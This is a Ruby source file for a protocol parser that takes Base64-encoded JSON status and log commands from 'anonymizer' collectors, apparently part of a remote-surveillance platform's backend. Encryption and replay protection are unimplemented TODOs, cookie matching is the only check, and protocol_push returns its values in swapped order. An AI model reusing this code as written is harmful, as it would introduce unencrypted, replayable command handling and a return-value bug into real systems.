require 'base64'

require 'rcs-common/trace'

module RCS
  module Controller

    STATUS_OK = 200
    STATUS_SERVER_ERROR = 500

    class ProtocolParser
      include RCS::Tracer

      def initialize(method, uri, content, http)
        @http_method = method
        @http_uri = uri
        @http_content = content
        @http = http
        @anonymizers = DB.instance.collectors
      end

      def act!

        case @http_method
          when 'PUSH'
            status, content = protocol_push
          when 'POST'
            status, content = protocol_post
        end

        return status, content
      end

      def protocol_push
        # TODO: implement push to anon

        # legacy code
        anon = JSON.parse(@http_content)
        LegacyNetworkController.push(anon)
        status = STATUS_OK
        content = 'OK'
        return content, status
      end

      def protocol_post

        # receive, check and decrypt a command
        commands = protocol_receive(@http[:cookie], @http_content)

        # parse the command
        status, response = protocol_execute_commands(commands)

        # encrypt the command
        response = protocol_send(@http[:cookie], response)

        return status, response
      rescue Exception => e
        trace :error, "Invalid received message: #{e.message}"
        trace :fatal, e.backtrace.join("\n")
        return STATUS_SERVER_ERROR, e.message
      end

      def protocol_receive(cookie, blob)
        # check that the cookie is valid and belongs to an anon
        @anon = @anonymizers.select {|x| x['cookie'].eql? cookie}.first
        raise "Invalid received cookie" unless @anon
        trace :info, "Anonymizer '#{@anon['name']}' is sending a command..."

        blob = Base64.decode64(blob)

        # TODO: retrieve the encryption keys and decrypt the blob

        blob = JSON.parse(blob)

        # TODO: anti replay attack

        return blob
      end

      def protocol_send(cookie, command)
        # retrieve the encryption key from the cookie
        @anon = @anonymizers.select {|x| x['cookie'].eql? cookie}.first
        raise "Invalid cookie to send" unless @anon

        command = command.to_json

        # TODO: encrypt the message

        blob = Base64.encode64(command)

        return blob
      end

      def protocol_execute_commands(commands)

        trace :debug, "[#{@anon['name']}] Received command is: #{commands.inspect}"

        # fallback to array if it's a single command
        commands = [commands] unless commands.is_a? Array

        # iterate over all the commands
        commands.each do |command|
          case command['command']
            when 'STATUS'
              protocol_status(command)
            when 'LOG'
              protocol_log(command)
          end
        end

        response = {command: 'STATUS', result: {status: 'OK'}}

        return STATUS_OK, response
      rescue Exception => e
        return STATUS_SERVER_ERROR, {command: 'STATUS', result: {status: 'ERROR', msg: e.message}}
      end

      def protocol_status(command)
        params = command['params']
        status = params['status']
        stats = params['stats']
        msg = params['mgs']
        version = params['version']

        # symbolize keys
        stats = stats.inject({}){|h,(k,v)| h.merge({ k.to_sym => v}) }

        report_status 'RCS::ANON::' + @anon['name'], @anon['address'], 'anonymizer', status, msg, stats, version
      end

      def report_status(name, address, type, status, message, stats, version=0)

        trace :info, "[NC] [#{name}] #{address} #{status} #{message}"

        # send the status to the db
        DB.instance.update_status name, address, status, message, stats, type, version
      end

      def protocol_log(command)
        params = command['params']
        DB.instance.collector_add_log(@anon['_id'], params['time'], params['type'], params['desc'])
      end

    end

  end
end
